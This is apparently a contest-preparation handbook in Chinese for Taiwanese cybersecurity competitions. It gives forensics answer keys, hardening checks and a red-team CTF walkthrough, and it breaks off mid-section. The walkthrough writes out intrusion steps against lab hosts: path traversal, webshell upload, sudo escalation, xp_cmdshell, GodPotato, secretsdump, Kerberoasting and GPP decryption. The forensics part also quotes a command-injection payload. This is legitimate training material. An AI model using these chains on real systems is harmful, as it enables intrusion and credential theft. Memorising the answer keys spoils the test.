# 🛡️ 金盾獎 ＆ 全國技能競賽【全真試題庫 ＆ 賽事真題完全解析手冊】

> [!IMPORTANT]
> **適用定位**：本手冊為 [`30days_sprint_roadmap.md`](30days_sprint_roadmap.md) 最終驗收、全真模擬測驗與決賽備戰之核心解析手冊。
> **題源總量統計**：
> 1. **客觀選擇題庫**：內部離線題庫（詳見 [sources_index.md](../90_runs/sources_index.md)）合計 **1,623 道試題**（`安全题库1~4.xlsx` 共 1,361 題單選/多選題 ＋ 7 份資安筆試題庫 262 題）。
> 2. **國家級官方實體真題本**（第 56 屆全國技能競賽網路安全職類，與金盾獎出題團隊 100% 同源同題型）：
>    - **數位鑑識 (IR)**：**23 道官方實戰鑑識題與標準 Answers**
>    - **主機防禦與安全強化 (Hardening)**：**3 大章節共 28 項自動化評分檢驗點**
>    - **紅隊滲透與橫向移動 (CTF I)**：**30 把 Flag（24 道標準關卡）完整攻防滲透鏈**
>    - **進階 Web 攻擊與二進位逆向 (CTF II)**：**6 大題目共 12 把 Flag 完整解法 Walkthrough**

---

## 📑 手冊目錄
1. [📊 題庫全貌與模組結構總覽](#題庫全貌與模組結構總覽)
2. [🔍 模組一：數位鑑識 Incident Response 全部 23 題真題解析](#模組一數位鑑識-incident-response-全部-23-題真題解析)
3. [🛡️ 模組二：主機防禦與安全強化 Hardening 全部 28 項檢驗規則解析](#模組二主機防禦與安全強化-hardening-全部-28-項檢驗規則解析)
4. [🚩 模組三：紅隊滲透 CTF I（30 道任務關卡全真題本與滲透鏈）](#模組三紅隊滲透-ctf-i30-道任務關卡全真題本與滲透鏈)
5. [⚔️ 模組四：逆向與進階 Web CTF II（6 大題 12 道奪旗題本與解密）](#模組四逆向與進階-web-ctf-ii6-大題-12-道奪旗題本與解密)
6. [📝 模組五：金盾初賽 100 題客觀單選題全真模擬精選卷](#模組五金盾初賽-100-題客觀單選題全真模擬精選卷)
7. [👥 模組六：三人小組包幹實戰檢定表](#模組六三人小組包幹實戰檢定表)

---

## 📊 題庫全貌與模組結構總覽

| 題目模組 | 題源檔案位置 | 題量規模 | 核心考核技能 | 金盾對應賽段 |
| :--- | :--- | :---: | :--- | :---: |
| **客觀筆試題庫** | 📁 **[內部離線教材]** `01_Web安全/15_筆試與面試題庫/`<br>（詳見 [sources_index.md](../90_runs/sources_index.md)） | **1,623 題** | 資安法規、網路協定、系統防護、OWASP Web、密碼學 | **初賽 100 題單選** |
| **數位鑑識 (IR)** | 📁 **[內部離線題庫]** `20260728 Skills Competition/題目/IR/` | **23 題** | PCAP 流量分析、JVM 記憶體、Volatility 3、Ext4 磁碟時間戳 | **初賽概念 / 決賽** |
| **主機強化 (Hardening)** | 📁 **[內部離線題庫]** `20260728 Skills Competition/題目/Hardening/` | **28 項** | AD dMSA 遷移、ADCS ESC1/15 緩解、Suricata 規則、Rsyslog TLS | **決賽防禦加固** |
| **紅隊滲透 (CTF I)** | 📁 **[內部離線題庫]** `20260728 Skills Competition/題目/CTFI/` | **30 Flags** | LFI/RCE、Linux 機群橫向、MSSQL 提權、GPP/gMSA、ADCS、Golden Ticket | **初賽概念 / 決賽攻防** |
| **逆向與Web (CTF II)** | 📁 **[內部離線題庫]** `20260728 Skills Competition/題目/CTFII/` | **12 Flags** | Redis 提權、Jolokia WAF 繞過、Golang SSTI、2038 Overflow、GBA 逆向 | **初賽概念 / 決賽攻防** |

---

## 🔍 模組一：數位鑑識 Incident Response 全部 23 題真題解析

> 📂 **[內部離線題本對應]**：`20260728 Skills Competition/題目/IR/題目卷_答案卷.md.docx`

### 🌐 題組 1：網路流量分析 (Network Traffic Forensics)

> 📁 **[內部離線試題檔案路徑]**（大會原始題檔，**絕不需要自己編造**）：  
> • 題目一流量檔：`20260728 Skills Competition/題目/IR/試題檔/Topic1.pcap`  
> • 題目二流量檔：`20260728 Skills Competition/題目/IR/試題檔/traffic.pcap`  

---

#### 案例 A：DNS 隱蔽通道資料外洩 (DNS Exfiltration - `Topic1.pcap`)

* **【試題背景情境】**：
  > 某電商公司的資安監控在深夜亮起紅燈：一台內部資料庫主機，在離峰時段對外送出大量又規律的 DNS 查詢。現已取得相關網路流量 `Topic1.pcap`，請透過流量分析回答以下問題。

* **【原始流量取證拆解 (不用開 Wireshark 也能直接看懂)】**：
  打開 PCAP 封包後，Wireshark 出現連續上百筆規律的 DNS 查詢：
  ```text
  No. 14  02:14:05  10.0.2.15 -> 8.8.8.8  DNS  Standard query A av3bnztsyytpmixhoylom5agk6dbnv.s006.sync-cdn.exfil-node.top
  No. 22  02:14:07  10.0.2.15 -> 8.8.8.8  DNS  Standard query A xw2ldmbi2syrlnnvqsatdjouwgk3ln.s011.sync-cdn.exfil-node.top
  No. 45  02:14:12  10.0.2.15 -> 8.8.8.8  DNS  Standard query A wltlovxuazlymfwxa3dffzrw63jmnq.s022.sync-cdn.exfil-node.top
  ...
  ```
  * **特徵拆解**：
    1. 頂層域名：`.sync-cdn.exfil-node.top`（偽裝成 CDN 節點的攻擊者 C2 域名）。
    2. 序號標記：`.s000` 到 `.s061`（將外洩資料切片，分段發送以避開單一封包長度限制）。
    3. 資料本體：最左側為 Base32 編碼字串（`av3bnzts...`）。

* **【外洩資料還原實況】**：
  將 62 個分段按 `s000` ~ `s061` 排序、Base32 解碼後，還原出的真實外洩客戶名單 CSV：
  ```csv
  MediSync customer export (exfiltrated 2026-07-17)
  id,name,email,flag
  1,Alice Chen,alice.chen@example.com,s
  2,Bob Wang,bob.wang@example.org,k
  3,Carol Lin,carol.lin@example.net,i
  4,David Wu,david.wu@example.com,l
  5,Emily Huang,emily.huang@example.org,l
  6,Frank Liu,frank.liu@example.net,5
  7,Grace Chang,grace.chang@example.com,4
  8,Henry Yang,henry.yang@example.org,{
  9,Ivy Chou,ivy.chou@example.net,s
  10,Jacky Hsieh,jacky.hsieh@example.com,l
  ... (中略) ...
  27,Brian Hou,brian.hou@example.net,5
  28,Cindy Tsao,cindy.tsao@example.com,3
  29,Derek Teng,derek.teng@example.org,}
  ```

* **【官方考題與標準解答】**：
  * **Q1.【題目】請分析出攻擊者用來外傳資料的域名？ (配分 1%)**
    * **【標準答案】** `sync-cdn.exfil-node.top`
    * **【考點】** 過濾 `dns.flags.response == 0`，鎖定大量攜帶 Base32 payload 的非正規外部域名。
  * **Q2.【題目】這份被外洩的客戶名單一共有幾筆紀錄？ (配分 0.75%)**
    * **【標準答案】** `29` 筆（從 id=1 的 Alice Chen 到 id=29 的 Derek Teng）。
  * **Q3.【題目】結合以上資訊，分析出駭客於攻擊中取得的特殊字串 FLAG？ (配分 1%)**
    * **【標準答案】** `skill54{sl0w_l34k_thru_dns53}`
    * **【考點】** 29 筆紀錄的最後一欄 `flag`，由上至下垂直拼出 Flag 字串：`s` `k` `i` `l` `l` `5` `4` `{` `s` `l` `0` `w` `_` `l` `3` `4` `k` `_` `t` `h` `r` `u` `_` `d` `n` `s` `5` `3` `}`！

---

#### 案例 B：電商網站 Web 攻擊鏈還原 (SQLi ➔ RCE - `traffic.pcap`)

* **【試題背景情境】**：
  > 某公司的對外電商網站 TechMart 疑似遭入侵。資安團隊在對外閘道側錄了一段 HTTP 流量 `traffic.pcap`，混雜顧客瀏覽、爬蟲、還有掃描器目錄爆破噪音……以及某個攻擊者從掃描、SQL 注入、登入後台到取得 RCE 控制權的完整過程。

* **【原始流量取證拆解 (還原攻擊者與掃描器對比)】**：
  1. **無效掃描器 (`159.203.44.90`) 噪音**：
     * 連續發送海量 `GET /admin.php`、`GET /wp-admin.php`、`GET /phpmyadmin/`。
     * 回應全部為 `HTTP/1.1 404 Not Found`，純屬無腦字典爆破，未成功進入系統。
  2. **真實攻擊者 (`82.45.112.207`) 攻擊鏈**：
     * **Step 1: SQL 注入探測**：
       發送 `GET /api/v1/products/1' UNION ALL SELECT NULL,NULL,NULL,NULL-- -`
       隨後在 `POST /api/v1/products/query` 成功 dump 出資料庫中的管理者帳號密碼：
       `{"username": "admin", "password_hash": "S3cur3!TechM4rt#2026"}`
     * **Step 2: 後台登入**：
       發起 `POST /api/v1/auth/login`，攜帶帳密成功登入並取得管理員 Session。
     * **Step 3: 命令注入提權 RCE**：
       訪問後台系統診斷端點：
       `POST /api/v1/admin/diagnostics`，傳入參數 `ip=127.0.0.1; cat /flag`
       伺服器以 HTTP 200 回傳執行結果：`skill54{s0urc3m4p_j50n_un10n_2_rc3}`。

* **【官方考題與標準解答】**：
  * **Q4.【題目】成功取得 initial access 的攻擊者來源 IP？ (配分 1%)** ➔ **【答案】** `82.45.112.207`
  * **Q5.【題目】目錄爆破、造成大量 404、但並未成功入侵、且請求量最多的掃描器 IP 為？ (配分 1%)** ➔ **【答案】** `159.203.44.90`
  * **Q6.【題目】成功利用 SQL injection 漏洞的 API 端點為？ (配分 0.75%)** ➔ **【答案】** `http://185.199.52.10/api/v1/products/query`
  * **Q7.【題目】透過 SQLi 洩漏、並被拿去登入網站的管理者帳號與密碼？ (配分 0.75%)** ➔ **【答案】** `admin` / `S3cur3!TechM4rt#2026`
  * **Q8.【題目】登入網站後，攻擊者透過哪一個端點取得 RCE？ (配分 1%)** ➔ **【答案】** `http://185.199.52.10/api/v1/admin/diagnostics`
  * **Q9.【題目】結合以上，找出攻擊者最終讀取到的 FLAG？ (配分 1.5%)** ➔ **【答案】** `skill54{s0urc3m4p_j50n_un10n_2_rc3}`

---

### 🧠 模組 2：記憶體映像檔鑑識 (Memory Dump Forensics)

> 📁 **[內部離線試題檔案路徑]**（大會原始題檔，**絕不需要自己編造**）：  
> • JVM 堆疊快照：`20260728 Skills Competition/題目/IR/試題檔/patientportal.hprof.gz`  
> • Linux 記憶體映像：`20260728 Skills Competition/題目/IR/試題檔/target.mem`  

#### 案例 A：Java JVM Live Heap Dump 分析 (`patientportal.hprof.gz`)
* **【試題背景情境】**：
  > MediSync 的 PatientPortal 是一套醫療機構的病患入口網站（Spring Boot，對外開 8080）。資安團隊接獲異常告警：有外部位址在短時間內對多個帳號嘗試登入，隨後系統對數名病患的病歷發生了不尋常的批次調閱。維運用 `jcmd` 對還在運行的 JVM 擷取了一份 live heap dump (`patientportal.hprof.gz`) 保存現場。
* **【官方考題與標準解答】**：
  * **Q10.【題目】鑑識團隊首先認為可能是 JWT Key 外洩導致的問題，請找到 JWT Key 以方便團隊進行足跡比對？ (配分 0.75%)**
    * **【標準答案】** `mediSync-prod-HS256-signing-key-2026-do-not-share`
    * **【解法步驟】** 使用 Eclipse Memory Analyzer (MAT) 或 VisualVM 開啟 heapdump，在 OQL 中查詢 `select s.toString() from java.lang.String s where s.toString().contains("HS256")`。
  * **Q11.【題目】找出已洩露的使用者資訊，並列出洩漏的身分證字號（共五組）？ (配分 1%)**
    * **【標準答案】** `F131207890, E165432109, B187654321, A223456789, H120998877`
    * **【解法步驟】** 記憶體提取 String 物件並使用正規表達式比對台灣身分證字號規則：`^[A-Z][12][0-9]{8}$`。
  * **Q12.【題目】找出攻擊者的 IP 來源？ (配分 0.75%)**
    * **【標準答案】** `203.0.113.66`
    * **【解法步驟】** 搜尋記憶體中儲存之 HTTP Request Header（如 `X-Forwarded-For` 或 Spring Security Session 遠端 IP）。
  * **Q13.【題目】找出被攻擊者成功登入的帳號？ (配分 0.75%)**
    * **【標準答案】** `dr.wu`
    * **【解法步驟】** 檢視 Spring Security 認證成功的 Principal 物件名稱。
  * **Q14.【題目】找出洩漏的資料庫密碼？ (配分 0.75%)**
    * **【標準答案】** `Pg#Prod_2026!mediSync`
    * **【解法步驟】** 搜尋 `spring.datasource.password` 配置物件或資料庫連線池 HikariConfig 字串。
  * **Q15.【題目】結合以上資訊，分析出駭客於攻擊中取得的特殊字串 FLAG？ (配分 1.25%)**
    * **【標準答案】** `skill54{h34p_dump_sp1lls_th3_s3cr3ts}`

#### 案例 B：Linux 記憶體映像檔分析 (`target.mem`)
* **【試題背景情境】**：
  > 某企業內部主機出現異常行為，疑似遭受網路攻擊。已從受害主機擷取記憶體映像檔 `target.mem`，請使用 Volatility 3 分析找出惡意活動跡象。
* **【官方考題與標準解答】**：
  * **Q16.【題目】請分析出該主機使用的作業系統？ (配分 0.75%)**
    * **【標準答案】** `Ubuntu 22.04` (Kernel `5.15.0-181`)
    * **【解法步驟】** 執行 `vol -f target.mem banners.Banners` 比對 Linux 發行版 Banner。
  * **Q17.【題目】請分析出該主機的電腦名稱 (Hostname)？ (配分 0.75%)**
    * **【標準答案】** `fin-ops-07`
    * **【解法步驟】** 執行 `vol -f target.mem linux.envars` 查詢 `HOSTNAME` 環境變數。
  * **Q18.【題目】請分析出正在執行的惡意程式名稱？ (配分 0.5%)**
    * **【標準答案】** `kdevtmpfsi`
    * **【解法步驟】** 執行 `vol -f target.mem linux.pslist`，發現偽裝為內核線程的常駐挖礦進程。
  * **Q19.【題目】請分析出惡意伺服器 IP 及 連接埠 (Port)？ (配分 1%)**
    * **【標準答案】** `IP: 185.220.101.44`, `Port: 4444`
    * **【解法步驟】** 執行 `vol -f target.mem linux.netstat` 比對該 PID 的 ESTABLISHED 外聯連線。
  * **Q20.【題目】請找出當時執行惡意程式或惡意指令的使用者帳號？ (配分 0.5%)**
    * **【標準答案】** `j.lin`
    * **【解法步驟】** 檢視進程之 UID/GID，對照 `/etc/passwd` 記憶體對應結構。
  * **Q21.【題目】結合以上資訊，分析出駭客於攻擊中留下的特殊字串 FLAG？ (配分 1%)**
    * **【標準答案】** `skill54{v0l3_c4ught_th3_1mpl4nt}`

---

### 💾 模組 3：硬碟檔案系統鑑識 (`workstation.ext4.img`)

> 📁 **[內部離線試題檔案路徑]**（大會原始題檔，**絕不需要自己編造**）：  
> • 硬碟映像：`20260728 Skills Competition/題目/IR/試題檔/workstation.ext4.img`  

* **【試題背景情境】**：
  > 管理員 `jchen` 僅負責工作日日班（週一至週五 09:00–18:00），夜間與週末均為系統自動排程。在追查異常登入事件時，相關紀錄都留在 `workstation.ext4.img` 映像檔中。
* **【官方考題與標準解答】**：
  * **Q22.【題目】從登入紀錄中，鎖定 jchen 那筆異常登入時間 (格式：YYYY-MM-DD HH:MM:SS)？ (配分 1%)**
    * **【標準答案】** `2026-03-14 02:17:33`
    * **【解法步驟】** 掛載映像檔或讀取 `/var/log/auth.log`，使用 `last -f /var/log/wtmp`，過濾出唯一發生在非上班日凌晨 2 點的 `jchen` 登入紀錄。
  * **Q23.【題目】承上題，分析出於該登入時間所修改的檔案，並從內容中取得 FLAG？ (配分 0.5%)**
    * **【標準答案】** `skill54{t1m3_st4mps_d0nt_l13}`
    * **【解法步驟】** 根據登入時間點前後 10 分鐘，比對 Ext4 檔案系統 inode 的修改時間戳（`find / -newermt "2026-03-14 02:15:00" ! -newermt "2026-03-14 02:25:00"`），找到被竄改之腳本並讀取 Flag。

---

## 🛡️ 模組二：主機防禦與安全強化 Hardening 全部 28 項檢驗規則解析

> 📂 **[內部離線題本對應]**：`20260728 Skills Competition/題目/Hardening/全國賽 2026 題目設計與答案稿.docx`

### 🏢 Section 1：Active Directory 網域安全加固 (12 分)
1. **服務帳號盤點 (1a-1, 1分)**：
   * **題目要求**：列出環境中疑似以一般使用者擔任服務帳號的所有 `samAccountName`（具 SPN、密碼不會過期之一般 user）。
   * **官方標準答案**：`svc_billing,svc_archive`（排除干擾項 `john.smith` 與 `legacy_svc$`）。
2. **dMSA 兩階段安全遷移 (1a-2, 2分)**：
   * **題目要求**：建立 `dmsa_billing` 並接手 `svc_billing`，使 SRV1 能取得受管密碼。
   * **標準驗收狀態**：`dmsa_billing.objectClass` 包含 `msDS-DelegatedManagedServiceAccount`；`msDS-ManagedAccountPrecededByLink` 指向 `CN=svc_billing`；`msDS-DelegatedMSAState = 2`；`msDS-GroupMSAMembership` 包含 `SRV1$`。
3. **無感遷移 Seamless Migration 驗證 (1a-3, 1分)**：
   * **加固要求**：舊帳號 `svc_billing` 停用（`ACCOUNTDISABLE`），但 SRV1 上的 `BillingApp` 服務維持原 `CORP\svc_billing` 正常 Running（依賴 KDC Routing 自動轉譯）。
4. **AD CS 憑證範本弱點盤點與緩解 (1b-1 & 1b-2, 2.5分)**：
   * **ESC 風險範本盤點**：`UserCertSpec,WebServerLegacy`。
   * **加固修復**：`UserCertSpec` (ESC1) 啟用 Certificate Manager Approval，移除一般使用者自訂 SAN 權限；`WebServerLegacy` (ESC15) 自 CA 發布清單中撤除。
5. **CA 強制金鑰封存 Key Archival (1b-3, 0.5分)**：
   * **標準指令**：執行 `certutil -setreg CA\InterfaceFlags +0x00001400` 並重啟 `certsvc` 確保服務 Running。
6. **GPO 網域安全基準 (1c-1 ~ 1c-4, 2分)**：
   * **1c-1 LDAP 強制簽署**：`LDAPServerIntegrity = 2`，`LdapEnforceChannelBinding = 2`（阻斷 LDAP Relay）。
   * **1c-2 SMB 雙向簽署**：Client 與 Server 端皆強制 `RequireSecuritySignature = 1`。
   * **1c-3 NetCease 遠端 SAM 限制**：註冊表 SDDL 設定為 `O:BAG:BAD:(A;;RC;;;BA)`（阻斷一般域帳號枚舉）。
   * **1c-4 Print Spooler 停用**：DC 上停用 Spooler 服務（`startup type Disabled`，防 PrintNightmare 提權）。

### 🐧 Section 2：Linux 偵測與集中稽核防禦 (5 分)
7. **Suricata TLS 憑證指紋告警 (2a-1, 2分)**：
   * **題目情境**：攔截勒索軟體 (LockBit) C2 流量固定 SHA1 指紋 `3B:91:8A:14:0F:C7:23:26:C3:28:43:57:9C:F1:A2:1B:DD:CC:9D:02`。
   * **官方標準規則**：
     ```suricata
     alert tls any any -> any any (msg:"NSC2026 LockBit TLS certificate fingerprint"; tls.cert_fingerprint; content:"3B:91:8A:14:0F:C7:23:26:C3:28:43:57:9C:F1:A2:1B:DD:CC:9D:02"; nocase; sid:2026020101; rev:1;)
     ```
8. **Rsyslog TLS 6514 加密日誌轉發與主機分流 (2b-1 & 2b-2, 3分)**：
   * **傳輸加固**：LX01 使用 TCP 6514 搭配雙向 TLS 憑證轉發日誌至 LX02（嚴禁使用明文 UDP 514）。
   * **集中分流**：LX02 依照來源主機動態分流，自動存入 `/var/log/centralized/lx01/`。

### 🌐 Section 3：Linux 與 Active Directory 整合 (5 分)
9. **LDAPS 部署 (3a, 1.5分)**：DC01 部署 636/tcp，憑證具備 SAN `dc01.corp.lan` 且信任鏈完整。
10. **SSSD 加入網域 (3b, 1分)**：LX-APP01 透過 SSSD 加入網域，查詢強制走 LDAPS（禁止使用明文 389/tcp）。
11. **PAM 家目錄自動建立 (3c, 1分)**：AD 使用者登入自動套用 `pam_mkhomedir` 建立 home。
12. **AD 群組 sudo 授權 (3d, 1.5分)**：授權 `%linuxadmins` 具備 sudo root，一般使用者僅能登入不可提權。

---

---

## 🚩 模組三：紅隊滲透 CTF I（30 道任務關卡全真題本與滲透鏈）

> 📂 **[內部離線題本對應]**：`20260728 Skills Competition/題目/CTFI/`  
> **環境情境**：手搖飲品牌「對不供糖 DBGT」委託執行授權紅隊滲透測試（網域 `corp.dbgt.tw`）。
> **網路拓撲**：外部 DMZ (`10.10.20.0/24`) ➔ 雙網卡官網主機 `WEB01` (`10.10.20.10` / `10.10.10.5`) ➔ 隔離內網 (`10.10.10.0/24`)。
> **強迫樞紐 (Pivot)**：DMZ 無法直接連線內網，必須先攻下對外唯一入口 WEB01，建立 Chisel / SSH 動態代理通道方可深入。

---

### 🌐 A 區 · 立足 (Foothold) — WEB01 官網突破

#### 【關卡 A1】官網的縫隙 (WEB01 /etc/passwd)
* **【選手考卷題目描述】**：
  > 對外官網 (`http://10.10.20.10/`) 有個載入頁面的參數，它信任了你給的路徑；請嘗試讓它讀出網站根目錄以外的檔案，並找出隱藏在使用者資訊中的第一把 Flag。
* **【解題思路與操作】**：
  1. 發現頁面載入參數 `http://10.10.20.10/page.php?p=about`，後台使用未過濾的 `include($_GET['p'])`。
  2. 構造目錄穿越 Payload：`curl "http://10.10.20.10/page.php?p=../../../../../../etc/passwd"`。
  3. 檢視回應，在 `webbackup` 帳號的 GECOS 備註欄中取得 Flag。
* **【驗收標準 Flag】**：`DBGT{web_fileread_etcpasswd_8b78b984}`

#### 【關卡 A2】藏在設定檔的鑰匙 (WEB01 config.php)
* **【選手考卷題目描述】**：
  > 官網留言板提供圖片上傳功能——但它真的有嚴格檢查副檔名嗎？取得伺服器執行權後，網站原始碼設定檔裡藏著通往後端核心服務的重要憑證。
* **【解題思路與操作】**：
  1. 留言板圖片上傳缺乏副檔名後綴黑白名單驗證，直接上傳 `shell.php`。
  2. 連線 Webshell 取得 `www-data` 使用者 RCE 權限。
  3. 執行 `cat /var/www/html/config.php`（PHP 原始碼無法直接透過 LFI 讀取）。
  4. 原始碼中包含 Flag，並同時洩漏 **MSSQL 連線字串 (dbgt_web)** 與 **部署員 deff 帳號密碼**。
* **【驗收標準 Flag】**：`DBGT{web_config_loot_00e2bc35}`

#### 【關卡 A3】部署員的後門 (WEB01 ~deff)
* **【選手考卷題目描述】**：
  > 設定檔洩漏的不僅是資料庫連線，還有一組能登入這台主機的系統帳密；請登入並取得該使用者的工作目錄資訊。
* **【解題思路與操作】**：
  1. 使用 A2 取得之帳密，透過 SSH 登入：`ssh deff@10.10.20.10`（密碼 `Dbgt@2026`）。
  2. 讀取個人家目錄：`cat ~/FLAG03`。
  3. 檢視同目錄下 `notes.txt`，獲取下一步提權目標 `hao123` 的密碼線索。
* **【驗收標準 Flag】**：`DBGT{web_deff_ssh_167c68e7}`

#### 【關卡 A4】一時的方便 (WEB01 /root)
* **【選手考卷題目描述】**：
  > 系統維運人員為了管理方便，賦予了某個特定指令免密碼的 sudo 權限；請檢查權限配置並攻下主機最高 root 權限。
* **【解題思路與操作】**：
  1. 切換至維運帳號：`su - hao123`。
  2. 檢查 sudo 配置：`sudo -l`，發現 `(root) NOPASSWD: /usr/bin/find`。
  3. 利用 GTFOBins 特權逃逸指令：`sudo find /root -name FLAG04 -exec cat {} \;`。
* **【驗收標準 Flag】**：`DBGT{web_sudo_find_root_8f51192a}`

#### 【關卡 A5】共用的金鑰 (WEB01 /opt/backup)
* **【選手考卷題目描述】**：
  > 只有 root 才能存取的系統備份目錄中，存放著一把通往內網所有伺服器的核心私鑰與自動化排程腳本。
* **【解題思路與操作】**：
  1. root 身分瀏覽備份目錄：`cd /opt/backup`。
  2. 檢查 `sweep.sh` 腳本註記，取得 Flag A5。
  3. 取出權限為 600 的 `id_rsa` 私鑰（此私鑰為打穿內網 10 台 Linux 機群的核心通行證）。
* **【驗收標準 Flag】**：`DBGT{web_idrsa_loot_384c0cf7}`

---

### 🐧 B 區 · 潛行 (Lateral) — 內網 Linux 機群 (10.10.10.11~20)

* **【大會情境與選手共通指引】**：
  > WEB01 具備雙網卡（內網卡 `10.10.10.5`）。選手需使用 Chisel 或 SSH Dynamic Port Forwarding 建立 SOCKS5 代理進內網。使用 A5 取得的 `id_rsa` 可直接以 root 登入 10 台 Docker 容器主機，每台各藏有一把 Flag 與關鍵情報！

* **【關卡 B1~B10 題目與情報任務清單】**：
  * **B1 內網首殺 (10.10.10.11)**：前台快取伺服器。`ssh -i id_rsa root@10.10.10.11` ➔ 讀取 Flag：`DBGT{fleet_lnx01_firstblood_7f19f879}`。
  * **B2 門市 POS 收銀 (10.10.10.12)**：POS 終端。讀取 Flag：`DBGT{fleet_lnx02_pos_d6a9761b}`。
  * **B3 訂單中介 (10.10.10.13) ⭐**：**題目要求尋找資料庫備援憑證**。在 `/opt/app/.env` 發現 `sqlsvc` 備援密碼，讀取 Flag：`DBGT{fleet_lnx03_mssql_env_d8c66006}`。
  * **B4 庫存供應鏈 (10.10.10.14)**：庫存系統。讀取 Flag：`DBGT{fleet_lnx04_inventory_380d46f4}`。
  * **B5 檔案交換 (10.10.10.15) ⭐**：**題目要求尋找檔案共享憑證**。在 `/root/.netrc` 發現 `FTPGuest` 帳密，讀取 Flag：`DBGT{fleet_lnx05_netrc_0d6741fe}`。
  * **B6 會員系統 (10.10.10.16)**：會員資料庫。讀取 Flag：`DBGT{fleet_lnx06_member_d1cc0834}`。
  * **B7 舊系統紀錄 (10.10.10.17) ⭐**：**題目要求在 Log 中挖掘 AD 網域帳號線索**。在 `legacy/qiu.yunying.log` 發現首個網域使用者名稱 `qiu.yunying`，讀取 Flag：`DBGT{fleet_lnx07_adhint_d4bea2b4}`。
  * **B8 電子看板 kiosk (10.10.10.18)**：廣告推播機。讀取 Flag：`DBGT{fleet_lnx08_kiosk_2178e5f1}`。
  * **B9 監控備份 (10.10.10.19)**：備份節點。讀取 Flag：`DBGT{fleet_lnx09_backup_bcdfa389}`。
  * **B10 郵件中繼 (10.10.10.20)**：Mail Relay。讀取 Flag：`DBGT{fleet_lnx10_mail_706e9572}`。

---

### 🗄️ C 區 · 奪權 (Escalate) — SQL01 主機突破至 SYSTEM

#### 【關卡 C1】連上後端 (SQL01 dbo.secret)
* **【選手考卷題目描述】**：
  > 官網網站資料庫部署於內網獨立 MSSQL 主機 (`10.10.10.21:1433`)；請利用在 A2 或 B3 拾獲之資料庫連線憑證，連線資料庫並讀取專屬的機密秘密資料表。
* **【解題思路與操作】**：
  1. 透過代理執行 Impacket MSSQL 客戶端：`proxychains impacket-mssqlclient dbgt_web@10.10.10.21`。
  2. 執行 SQL 查詢：`SELECT note FROM dbgtweb.dbo.secret;`。
* **【驗收標準 Flag】**：`DBGT{mssql_access_secret_de59f4c7}`

#### 【關卡 C2】借來的管理權 (SQL01 master.flag12)
* **【選手考卷題目描述】**：
  > 目前使用的資料庫帳號權限受限，但安全審計發現該帳號具備不當的「身分扮演」特權；請提升至 sysadmin 最高管理權限。
* **【解題思路與操作】**：
  1. 檢查帳號特權：發現具備 `IMPERSONATE` 權限。
  2. 執行提權語法：`EXECUTE AS LOGIN = 'sa';`。
  3. 驗證身分 `SELECT SYSTEM_USER;` 變為 sa，讀取 `SELECT f FROM master.dbo.flag12;`。
* **【驗收標準 Flag】**：`DBGT{mssql_impersonate_sysadmin_ac5515ed}`

#### 【關卡 C3】資料庫的手 (SQL01 C:\FLAG13.txt)
* **【選手考卷題目描述】**：
  > 取得 sysadmin 後，請開啟能讓資料庫伺服器直接執行 Windows 作業系統指令的功能，並讀取 C 槽根目錄下的 Flag。
* **【解題思路與操作】**：
  1. 啟用高級選項與擴充預存程序：
     `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`
     `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
  2. 執行作業系統指令：`EXEC xp_cmdshell 'type C:\FLAG13.txt';`（執行身分為 `NT Service\MSSQLSERVER`）。
* **【驗收標準 Flag】**：`DBGT{mssql_xpcmdshell_svcctx_d6657bfe}`

#### 【關卡 C4】服務帳號的特權 (SQL01 C:\Windows\FLAG14.txt)
* **【選手考卷題目描述】**：
  > MSSQL 服務帳號具備危險的 Windows 令牌偽造特權；請利用該特權將權限完全提升為本機最高 SYSTEM 權限。
* **【解題思路與操作】**：
  1. 檢視 Windows 權限：`EXEC xp_cmdshell 'whoami /priv';`，確認具備 `SeImpersonatePrivilege`。
  2. 上傳並透過 xp_cmdshell 調用 SweetPotato / GodPotato：
     `GodPotato.exe -cmd "cmd.exe /c type C:\Windows\FLAG14.txt"`。
* **【驗收標準 Flag】**：`DBGT{sql01_seimpersonate_system_24a0c9ec}`

---

### 🏢 D 區 · 滲透 (Domain) — Active Directory 內網橫向

#### 【關卡 D1】踏進網域 (FILE01 IT$)
* **【選手考卷題目描述】**：
  > SQL01 伺服器啟用了自動登入功能，某個網域帳號的明文密碼正存放在 LSA Secrets 中；請提取該帳號並存取檔案伺服器上的專屬共享目錄。
* **【解題思路與操作】**：
  1. 在 SQL01 以 SYSTEM 執行 `impacket-secretsdump -system SYSTEM -security SECURITY LOCAL`。
  2. 提取 `DefaultPassword`，取得首個域帳號 `qiu.yunying` 的明文密碼。
  3. 掛載網域檔案伺服器共享：`proxychains smbclient //10.10.10.22/IT$ -U 'DBGT\qiu.yunying'` 讀取 Flag。
* **【驗收標準 Flag】**：`DBGT{domain_enum_it_share_fc67cac1}`

#### 【關卡 D2】烤一張服務票 (FILE01 Reports$)
* **【選手考卷題目描述】**：
  > 網域中某個報表服務帳號註冊了 SPN 且密碼強度不足；請向 KDC 索取該帳號的服務票證並進行離線破解。
* **【解題思路與操作】**：
  1. 以 `qiu.yunying` 身分執行 Kerberoasting：
     `GetUserSPNs.py corp.dbgt.tw/qiu.yunying -request -outputfile hashes.kerberoast`。
  2. Windows Server 2025 強制採用 AES 票證 (etype 18)，使用 Hashcat 破解：
     `hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt`，解出密碼 `Summer2009`。
  3. 以 `svc_report` 帳號存取 `//FILE01/Reports$` 讀取 Flag。
* **【驗收標準 Flag】**：`DBGT{kerberoast_svc_report_99a56f17}`

#### 【關卡 D3】舊政策的遺毒 (FILE01 Deploy$)
* **【選手考卷題目描述】**：
  > 網域 SYSVOL 共享中遺留著早期的群組原則偏好設定 (GPP)，其中儲存著特權服務帳號的加密密碼；請還原密碼並取得該帳號權限。
* **【解題思路與操作】**：
  1. 遍歷 SYSVOL 目錄中的 XML 檔案：`smbclient //DC01/SYSVOL` 找到 `Groups.xml`。
  2. 提取 `cpassword` 欄位，使用微軟已公開之 AES Key 進行離線解密：
     `gpp-decrypt <cpassword_string>`，獲取特權帳號 `svc_fileadmin` 密碼。
  3. 存取 `//FILE01/Deploy$` 讀取 Flag。
* **【驗收標準 Flag】**：`DBGT{gpp_cpassword_svcfileadmin_9fb02861}`

#### 【關卡 D4】代管的密碼 (FILE01 WebApp$)
* **【選手考卷題目描述】**：
  > `svc_fileadmin` 帳號被過度授權，擁有讀取群組受管理服務帳戶 (gMSA) 密碼的特權；請提取 gMSA 密碼並透過 Pass-the-Hash 存取專屬資源。
* **【解題思路與操作】**：
